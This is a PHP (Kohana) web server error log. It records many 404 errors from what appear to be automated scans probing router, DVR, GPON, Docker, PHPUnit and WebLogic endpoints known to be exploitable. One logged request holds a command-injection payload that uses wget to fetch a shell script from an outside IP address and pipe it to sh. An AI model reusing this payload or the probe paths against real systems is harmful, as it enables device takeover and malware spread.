2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL boafrm/formSysCmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL boafrm/formSysCmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: boardDataWW.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: boardDataWW.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: PictureCatch.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: PictureCatch.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL GponForm/diag_Form was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL GponForm/diag_Form was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dvr/cmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dvr/cmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/SystemCommand was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/SystemCommand was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/shortcut_telnet.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/shortcut_telnet.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/cgi_main.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/cgi_main.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/server/server.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/server/server.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/iptest.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/iptest.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/mp was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/mp was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/system_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/system_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/account_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/account_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/Mail_Test was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/Mail_Test was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/;wget${IFS}-qO-${IFS}http:/74.194.191.52/rondo.sbx.sh|sh&echo${IFS} ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/;wget${IFS}-qO-${IFS}http:/74.194.191.52/rondo.sbx.sh|sh&echo${IFS} ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: device.rsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: device.rsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL user/register was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL user/register was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:45:10 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL developmentserver/metadatauploader was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:45:10 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL developmentserver/metadatauploader was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 14:57:33 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL containers/json was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 14:57:33 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL containers/json was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 14:57:34 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL containers/json was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 14:57:34 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL containers/json was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 14:57:34 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 14:57:34 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 15:18:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 15:18:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 15:19:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 15:19:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 15:58:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL actuator/health was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 15:58:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL actuator/health was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 16:36:46 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-29 16:36:46 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-29 16:56:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:13 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/webRead/open was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 16:56:13 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/webRead/open was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 16:56:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL wls-wsat/CoordinatorPortType was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 16:56:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL wls-wsat/CoordinatorPortType was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 16:56:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/login.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/login.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply_sec.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply_sec.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:14 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL boafrm/formSysCmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 16:56:14 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL boafrm/formSysCmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 16:56:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: boardDataWW.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: boardDataWW.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: PictureCatch.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: PictureCatch.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL GponForm/diag_Form was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 16:56:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL GponForm/diag_Form was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 16:56:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dvr/cmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 16:56:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dvr/cmd was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 16:56:15 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/SystemCommand was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 16:56:15 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/SystemCommand was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 16:56:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/shortcut_telnet.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/shortcut_telnet.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: setup.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/cgi_main.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/cgi_main.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/server/server.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/server/server.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/iptest.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/iptest.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/mp was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 16:56:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/mp was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 16:56:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/system_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/system_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/account_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 16:56:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/account_mgr.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 16:56:16 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/Mail_Test was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 16:56:16 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/Mail_Test was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
